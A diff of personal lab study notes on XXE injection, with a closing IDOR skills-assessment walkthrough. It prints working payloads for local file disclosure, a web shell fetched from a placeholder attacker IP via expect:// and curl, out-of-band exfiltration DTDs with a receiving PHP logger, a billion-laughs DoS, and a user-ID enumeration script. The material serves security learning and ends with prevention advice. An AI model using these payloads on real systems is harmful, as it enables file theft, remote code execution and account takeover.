@@ -240,21 +240,252 @@ echo "<a href='" . $row['url'] . "' target='_blank'></a>";
 No hashing on the front end, do it when object is created and store it in the backend. The techniques from this part of the module can still be used when we have UUIDs, like repeating one user's request with another's session. 
 
  
+## XML External Entity (XXE) Injection
+
+### Intro
+These vulns occur when XML data taken from user controlled input not proprly sanitised. XML similar to HTML and SGML. Formed of element trees, each element is denoted by a `tag`. Tags are things like `<date>`, entities are XML variables, usually wrapped with & or ; chars. 
+
+#### DTD
+dtd = Document type definition, pre-defined structs e.g:
+```xml
+<!DOCTYPE email [
+  <!ELEMENT email (date, time, sender, recipients, body)>
+  <!ELEMENT recipients (to, cc?)>
+  <!ELEMENT cc (to*)>
+  <!ELEMENT date (#PCDATA)>
+  <!ELEMENT time (#PCDATA)>
+  <!ELEMENT sender (#PCDATA)>
+  <!ELEMENT to  (#PCDATA)>
+  <!ELEMENT body (#PCDATA)>
+]>
+```
+
+Shows how elements can have child elements, like the email. Whereas others could have raw data (PCDATA). That stuff up top can be placed right after the XML declaration. Or, stored in seperate external file `email.dtd`. And referenced using `SYSTEM`:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email SYSTEM "email.dtd">
+```
+
+You can also replace the local file path with a URL.
+
+#### Entities
+Define custom entities (vars) in DTDs, to reduce repetition. Done with `ENTITY` keyword:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+  <!ENTITY company "Inlane Freight">
+]>
+```
+
+Can then be referenced `&company;`. You can repeat the `SYSTEM` thing here too. You can use the `PUBLIC` keyword instead for loading external resources.
 
 
-`
+### Local file disclosure
+Suppose we can define new entities and have them displayed via some web app. In that case, we should also be able to define external entites and ref a local file, particularly the juicy ones. 
+
+#### Identify
+Excercise has a contact form. Opened burp on pwnbox (using an internal IP here). Doing a test submission shows a POST to `/submitDetails.php` with the `Content-Type` as `text/plain`. Then the document tree underneath. Web page says "we will contact you soon" but the web response mentions the email. This is the identification: **we see XML being sent, and make note of what is being refered to**. 
+
+Let's define an entity and then refer it in the POST request. Entity:
+```xml
+<!DOCTYPE email [
+  <!ENTITY company "Inlane Freight">
+]>
+```
+
+Then we use `&company;` under the `<email>` tag for the request. It shows the text. Therefore, we may be able to inject code. A non-vulnerable web app would show "&company;". 
+
+> Some may default to JSON, but could still accept other formats. You can try changing the `Content-Type` and convert the JSON to XML with some [online tool](https://www.convertjson.com/json-to-xml.htm).
 
 
+#### Reading sensitive files
+Lets replace the company definition from "Inlane Freight" to SYSTEM "file:///etc/passwd" and repeat. It gave a blank response. I had a hyphen at the end. Be specific. 
+
+#### Reading source code
+If we can read source code of the web app, then we can then whitebox pen test. Trying to read `file:///index.php` does not work. Apparently because it is not in a proper XML format, so it fails. The way around is to use the PHP wrapper filters to base64 encode. This now becomes:
+```xml
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+]>
+```
+The burp inspector can then decode on the fly. **Trick only works for PHP web apps**. 
+
+#### RCE w/ XXE
+Easiest method would to look for ssh keys, utilise a "hash stealing trick" in windows based apps, or by making a call to our server. If those do not work, may still be able to execute commands on PHP-based web apps through the filter of `expect://`. Requires the module to be installed and enabled. Most efficient way is by writing a web shell from our server and writing it to the web app. To start our server lets:
+
+```bash
+$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
+$ sudo python3 -m http.server 80
+```
+And then change the XML to run a `curl` and get our shell:
+```xml
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+]>
+```
+All spaces replaced with `$IFS` to avoid breaking XML syntax. Other chars like |>{ may also break the code, so try to avoid. 
+
+#### Other XXE Attacks
+SSRF exploitation, used to enumerate locally open ports and access their pages though the XXE vuln. See Server-side attacks. DOS can also be done with a payload of:
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY a0 "DOS" >
+  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
+  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
+  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
+  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
+  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
+  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
+]>
+```
+And then reference `&a0;`. No longer works with modern web servers, as they protect against entity self-reference. 
+
+### Advanced file disclosure
+#### CDATA
+PHP filters before allowed us to view some files, but what about others? We can use another method to exfil data (inc. binary). The method is wrapping with `CDATA` e.g. `<![CDATA[ FILE_CONTENT ]>`. One way to get this in something we can manipulate:
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY begin "<![CDATA[">
+  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY end "]]>">
+  <!ENTITY joined "&begin;&file;&end;">
+]>
+```
+
+We then reference `&joined;`. Sadly will not work since XML prevents joining internal and external entites. To bypass, we utilize XML parameter entities. What's unique about parameter entities is that if we reference them from an external source, then all of them would be considered as external and can be joined:
+```xml
+<!ENTITY joined "%begin;%file;%end;">
+```
+
+and put this on our exploit server:
+```bash
+$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+$ python3 -m http.server 8000
+```
+
+And define the parameter entities with the `%`:
+```xml
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
+  %xxe;
+]>
+...
+<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
+```
+
+Annoyingly I could not get this working on the pwnbox. Unable to tell why....
+
+#### Error based
+If web app displays runtime errors, it does not have proper execption handling for the XML. We can use this to reat the output of the XXE exploit. If web app neither writes XML output nor displays any errors, then its a completley blind situation. 
+
+Detected by putting `&nonExistingEntity;` and reading a runtime exception in the response. New dtd file to host:
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+```
+Works by defining the file parameter entity and then joins with an entity that does not exist. We are expecting the file to be a part of the error. Other variables like a bad URI or bad characters in the referencd file. 
+
+Then the request to obtain the file is now:
+```xml
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %error;
+]>
+```
+
+This method not as reliable, as it may have length limitations, and certain special chars may still break it. 
+
+Getting the flag worked on the error based approach. The CDATA approach apparently only worked for `index.php`! **That will be why.** Weird how it does not let you actually follow along though. Trying the CDATA method at the new URL did not fully work either.
+
+### Blind data exfiltration
+Previous section is an exmaple of a blind xxe vuln, where we did not recieve any output containing any of our XML input. As the web server was displaying errors, we could use it to read files. But now we are going to be in a completley blind situation.
+
+Using a method of `Out-of-band (OOB) Data Exfiltration`, which is similar to SQL injections, blind command injections, blind XSS and blind XXE. Similar to hosting the DTD file, but instead we will be getting the web app to send a web request to our server with the content of the file we want to read. To do so, we make param entites:
+
+1. Base encoded file we want
+2. The web request to our server
+
+payload:
+```xml
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+```
+Makes a self-loop, and then either a python server can sput the data, or a PHP server can run and do the decoding for us. E.g. make an `index.php`:
+```php
+<?php
+if(isset($_GET['content'])){
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?>
+```
+and start the server with `php -S 0.0.0.0:8000`
 
 
+#### Automated OOB efil.
+Such a tool is [XXEinjector](https://github.com/enjoiz/XXEinjector). Copy the POST from burp into a file and place the `XXEINJECT` under where the XML data starts. I.E. `<?xml version="1.0" encoding="utf-8"?> XXEINJECT`. Runs via `ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter`
+
+Does not print the exfil data, it is in the logs: `cat Logs/<HOST>/etc/passwd.log`
 
 
+### XXE Prevention
+Easier than others, caused mainly by outdated XML libraries
+
+#### Avoiding outdated components
+The PHP `libxml_disable_entity_loader` function is deprecated since it allows a dev to enable external entities in an unsafe manner, leading to the ones exploited in this module. The warning is just "Warning
+This function has been DEPRECATED as of PHP 8.0.0. Relying on this function is highly discouraged." which is interesting. Maybe the dev got this from some CVE website and built a box like that. 
+
+Fancy IDEs also highlight that functions are deprecated. OWASP also has an [XXE prevention cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#php). 
+
+You will also need to update any components that parse XML input, such as API libraries like SOAP. Same goes for SVG image processors or PDF document processors. Same again with `node` modules. 
 
 
+#### Safe XML Configs
+Certain XML configs for web apps help reduce the possibility, these include:
+- Disable referencing custom Document Type Definitions (DTDs)
+- Disable referencing External XML Entities
+- Disable Parameter Entity processing
+- Disable support for XInclude
+- Prevent Entity Reference Loops
+
+Also have proper exception handling to stop error based attacks. Many recommend other formats such as `JSON` or `YAML`. Also includes avoiding API standards that reply on XML (like SOAP) and JSON-based APIs instead (e.g. REST)
 
 
+## Skills Assessment
+Functionality of web app has a user and login
+And has a settings.php file to change password. Seems like a chaining can be done. 
 
+- There is a `uid` Cookie when changing passwords
+- There is `/api.php/user/74`
 
+Running an intruder attack on /api.php/user/<> for 1-30 is giving details. 
 
+Looking into the source code of `/settings.php` we can see GET call to `/api.php/token/<uid>` where the UID is the cookie.
 
+We need someone who is an admin. Lets fuzz and get a result with admin in the name. The wfuzz kinda worked, the regex filtering is case sensitive, whereas a python script could have done this:
+```python
+import requests
 
+ip = <>
+port = <>
+
+for i in range(0,100):
+    res = requests.get(f"http://{ip}:{port}/api.php/user/{i}")
+    if "admin" in res.text.lower():
+        print(f"uid {i} gave potential data: {res.text}")
+```
+
+Anyways, UID 52 gives us a username of "a.corrales"
+
+Getting the token via a repeater and then making a POST to `reset/php` with the admin's token is giving "Access denied" but when making a PUT we get "Missing parameters"
+
+-> Need to either get access to user UID 52, or give myself permissions like the user of 52, company "Administrator"
